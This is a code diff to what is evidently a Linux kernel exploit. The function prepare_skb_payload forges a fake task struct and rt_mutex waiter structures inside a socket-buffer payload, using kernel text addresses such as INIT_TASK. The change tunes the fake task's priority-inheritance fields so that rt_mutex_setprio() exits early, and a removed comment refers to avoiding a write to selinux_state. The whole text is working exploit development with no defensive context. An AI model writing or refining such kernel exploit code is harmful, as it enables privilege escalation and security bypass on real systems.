@@ -530,6 +530,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   uint64_t waiter_task = text_addr(INIT_TASK);
   uint64_t task_group = text_addr(ROOT_TASK_GROUP);
   uint64_t pi_top_task = text_addr(INIT_TASK);
+  if (payload_mode == PAGE_PAYLOAD_FOPS && pselect_custom_write) {
+    /*
+     * Custom writes stamp waiter->task with fake_task. Keep the fake task's
+     * cached PI top donor in sync so rt_mutex_setprio() can bail out before it
+     * needs scheduler state that the fake task does not model.
+     */
+    pi_top_task = fake_task;
+  }
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     write_pc = SLIDE_LOGGERS_0_1;
     write_right = 0;
@@ -573,16 +581,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
-      if (pselect_custom_write) {
-        /* Empty pi_waiters: erase uses W0's parent pointers (not root),
-         * re-insert finds empty tree → sole root → no rebalancing.
-         * This prevents the insert from touching selinux_state. */
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-      } else {
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-        put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
-      }
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     } else {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
